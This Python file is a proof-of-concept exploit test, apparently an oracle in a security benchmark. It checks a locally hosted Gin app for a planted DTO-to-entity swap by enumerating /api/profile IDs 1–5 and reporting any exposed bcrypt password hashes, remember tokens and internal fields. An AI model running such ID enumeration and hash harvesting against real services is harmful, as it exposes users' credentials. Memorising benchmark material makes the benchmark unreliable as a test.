"""PoC exploit: 3-stage DTO swap leak — replaces safe UserProfileDTO with raw ZUsers entity, exposing bcrypt password hashes (CWE-200)."""

from mosaic.oracle.exploit import ExploitTest


class DtoSwapExploit(ExploitTest):
    """User profile leak: Password hash exposed after DTO-to-entity swap."""

    def __init__(self, base_url: str = "http://localhost:39081"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "gin_dto_struct_swap_user_profile"

    def setup(self) -> None:
        """No setup needed — public API."""
        pass

    def execute(self) -> tuple[bool, str]:
        """Fetch user profile and check for leaked Password field."""
        # Try user IDs 1-5
        for user_id in range(1, 6):
            resp = self.http_get(f"/api/profile/{user_id}")

            if resp.status_code == 404:
                continue
            if not resp.ok:
                continue

            try:
                data = resp.json()
            except Exception:
                continue

            # Navigate Gin blog response format
            payload = data.get("data", data)
            if isinstance(payload, dict):
                item = payload
            elif isinstance(payload, list) and payload:
                item = payload[0]
            else:
                continue

            if not isinstance(item, dict):
                continue

            evidence = []
            vuln = False

            # Check for Password field (bcrypt hash)
            val = item.get("Password") or item.get("password")
            if val and isinstance(val, str) and len(val) > 5:
                is_bcrypt = str(val).startswith("$2")
                evidence.append(f"{'Password' if 'Password' in item else 'password'} field exposed: '{str(val)[:30]}...'")
                if is_bcrypt:
                    evidence.append("(bcrypt hash detected)")
                vuln = True

            # Check for Status (internal field)
            if "Status" in item or "status" in item:
                status_val = item.get("Status") or item.get("status")
                evidence.append(f"'Status' internal field exposed: {status_val}")
                vuln = True

            # Check for RememberToken
            if "RememberToken" in item or "remember_token" in item:
                evidence.append("'RememberToken' field exposed")
                vuln = True

            if vuln:
                return True, f"Data leaked at /api/profile/{user_id} (CWE-200). " + " ".join(evidence)

            field_names = list(item.keys())
            # Safe DTO should have only id, name, email (3 fields)
            if len(field_names) > 4:
                return True, f"Excess fields at /api/profile/{user_id} (expected 3, got {len(field_names)}): {field_names}"

            return False, f"User {user_id} profile has only safe fields. Keys: {field_names}"

        return False, "No users found at /api/profile/1-5"
